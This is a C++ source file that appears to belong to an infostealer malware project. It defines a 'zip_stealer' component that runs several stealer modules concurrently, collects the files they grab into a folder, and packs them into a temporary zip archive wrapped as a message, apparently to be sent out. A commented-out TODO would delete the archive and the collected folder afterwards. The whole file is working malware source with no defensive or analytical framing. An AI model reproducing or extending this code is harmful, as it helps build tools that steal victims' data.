#include "zip_stealer.h"
#include "zipable.h"
#include "messages/error_message.h"
#include "libzippp/libzippp.h"
#include "messages/file_message.h"

zip_stealer_t::zip_stealer_t(std::vector<std::unique_ptr<base_stealer_t>>&& in_to_zip
                             , const fs::path& in_zip_folder_path)
{
    to_zip = std::move(in_to_zip);
    zip_folder_path = in_zip_folder_path;
}

asio::awaitable<std::unique_ptr<message_t>> zip_stealer_t::steal()
{
    std::vector<std::unique_ptr<message_t>> result;

    std::vector<asio::awaitable<void>> to_await;
    for (const auto& st : to_zip)
    {
        if(const auto zipable = dynamic_cast<zipable_t*>(st.get()))
            zipable->set_save_folder(zip_folder_path);

        auto func = [&result](decltype(st)& st) -> asio::awaitable<void>
        {
            result.push_back(co_await st->steal());
        };

        to_await.push_back(func(st));
    }

    co_await net::wait(to_await.begin(), to_await.end());

    for (auto& message : result)
    {
        if(dynamic_cast<error_message_t*>(message.get()))
            co_return std::move(message);
    }

    using namespace libzippp;

    const auto archive_path = net::get_temp_unique_file_path().replace_extension("zip");

    ZipArchive zf{archive_path.string()};
    zf.open(ZipArchive::New);

    if(!fs::exists(zip_folder_path))
        co_return std::make_unique<error_message_t>("ZipStealer(ERROR): cant access zip folder");

    for(const auto& file : fs::recursive_directory_iterator{zip_folder_path})
    {
        if(!file.is_regular_file())
            continue;
        auto rel_path = fs::relative(file.path(), zip_folder_path);
        if(!zf.addFile(rel_path.relative_path().make_preferred().string(),
            file.path().string()))
            DLOG("ZipStealer(ERROR): could not add file");
    }

    zf.close();

    if(!fs::exists(archive_path))
        co_return std::make_unique<error_message_t>("ZipStealer(ERROR): cant create archive");

    auto to_ret = std::make_unique<file_message_t>();
    to_ret->init_with_path(archive_path.string());

    /* TODO uncomment
    fs::remove(archive_path);
    fs::remove(zip_folder_path);
    */

    co_return to_ret;
}
